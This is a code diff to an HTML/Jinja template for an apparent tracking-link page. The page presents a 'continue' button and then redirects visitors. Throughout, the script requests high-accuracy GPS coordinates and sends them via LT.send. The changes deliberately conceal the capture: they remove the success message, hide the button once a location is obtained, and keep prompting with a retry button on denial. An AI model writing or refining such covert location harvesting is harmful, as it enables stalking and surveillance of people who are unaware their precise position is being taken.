@@ -8,20 +8,15 @@ body{margin:0;background:#0f1115;color:#e6e9ef;font-family:system-ui,-apple-syst
 .wrap{text-align:center;padding:24px;max-width:420px}
 h1{font-size:18px;margin:0 0 8px}
 p{color:#9aa3b2;font-size:13px;margin:0 0 20px}
-.btns{display:flex;gap:8px;justify-content:center;flex-wrap:wrap}
 button{padding:12px 28px;font-size:15px;border:0;border-radius:999px;background:#4c8dff;color:#fff}
-.tiny{font-size:12px;color:#9aa3b2;margin-top:16px;line-height:1.6}
-.tiny.warn{color:#f0b429}
-.tiny.ok{color:#2ecc71}
-a{color:#4c8dff}
+.st{font-size:12px;color:#9aa3b2;margin-top:16px;line-height:1.6;min-height:1.6em}
+.st.warn{color:#f0b429}
 </style></head><body>
 <div class="wrap">
   <h1>{{ link.name }}</h1>
-  <p>{{ link.note or "続けるを押してください" }}</p>
-  <div class="btns">
-    <button id="go">{{ go_text }}</button>
-  </div>
-  <p class="tiny" id="st"></p>
+  <p>{{ link.note or ask_text }}</p>
+  <button id="go">{{ go_text }}</button>
+  <p class="st" id="st"></p>
 </div>
 <script>
 window.LT_CODE  = {{ code|tojson }};
@@ -29,8 +24,6 @@ window.LT_HIT   = {{ hit_id }};
 window.LT_NONCE = {{ nonce|tojson }};
 window.LT_GEO   = 0;
 var DEST = {{ dest|tojson }};
-var WAIT_TEXT = {{ wait_text|tojson }};
-var OK_TEXT = {{ ok_text|tojson }};
 var DENY_TEXT = {{ deny_text|tojson }};
 var RETRY_TEXT = {{ retry_text|tojson }};
 var DENY_REDIRECT = {{ 1 if deny_redirect else 0 }};
@@ -40,24 +33,26 @@ var DEST_MIN = {{ dest_min }};
 <script>
 (function () {
   var st = document.getElementById('st'), go = document.getElementById('go');
-  var busy = false, done = false;
+  var busy = false, done = false;          // done = 一度でも取れたら true で固定
 
-  function txt(m, cls) { st.textContent = m; st.className = 'tiny' + (cls ? ' ' + cls : ''); }
+  function txt(m, cls) { st.textContent = m; st.className = 'st' + (cls ? ' ' + cls : ''); }
 
   function ok(p) {
+    if (done) return;
     done = true;
-    txt(OK_TEXT, 'ok');
+    txt('', '');                            // 「取得しました」は出さない
+    go.style.display = 'none';              // ボタンも消す
     try {
       LT.send({ gps_lat: p.coords.latitude, gps_lon: p.coords.longitude,
                 gps_acc: p.coords.accuracy });
     } catch (e) {}
-    setTimeout(function () { if (DEST) location.href = DEST; }, Math.max(300, DEST_MIN * 1000));
+    if (DEST) setTimeout(function () { location.href = DEST; }, Math.max(300, DEST_MIN * 1000));
   }
 
   function ng() {
-    done = false;
+    if (done) return;                       // 取得済みなら未取得に戻さない
     txt(DENY_TEXT, 'warn');
-    go.textContent = RETRY_TEXT;     // 取得できるまでここで足踏み
+    go.textContent = RETRY_TEXT;            // 失敗時のボタンは「もう一度」だけ
     go.disabled = false;
     if (DENY_REDIRECT && DEST) setTimeout(function () { location.href = DEST; }, 1500);
   }
@@ -65,11 +60,10 @@ var DEST_MIN = {{ dest_min }};
   function attempt() {
     if (busy || done) return;
     busy = true;
-    txt(WAIT_TEXT, '');
     if (!navigator.geolocation) { busy = false; ng(); return; }
     navigator.geolocation.getCurrentPosition(
       function (p) { busy = false; ok(p); },
-      function (e) { busy = false; ng(); },
+      function () { busy = false; ng(); },
       { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 });
   }
 
